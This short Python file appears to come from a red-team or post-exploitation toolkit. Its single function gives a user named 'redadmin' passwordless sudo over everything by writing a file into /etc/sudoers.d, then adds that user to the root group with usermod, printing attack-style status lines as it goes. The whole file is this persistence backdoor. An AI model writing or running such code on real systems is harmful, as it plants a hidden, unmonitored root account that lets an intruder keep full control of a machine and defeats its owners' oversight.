import os
import subprocess
# from colorama import init, Fore, Back, Style

def add_to_root_func():    
    print(f"[*] START ADD USER TO ROOT")
    os.chdir('/etc/sudoers.d/')    

    with open('redadmin', 'w+') as f:
        data = "redadmin ALL=(ALL) NOPASSWD: ALL"
        f.write(data)

    shell_command = "usermod -aG root redadmin"
    subprocess.run(shell_command, shell=True, check=True)
    print(f"[+] ADD USER TO ROOT SUCCESSFULLY")
    print("===============================")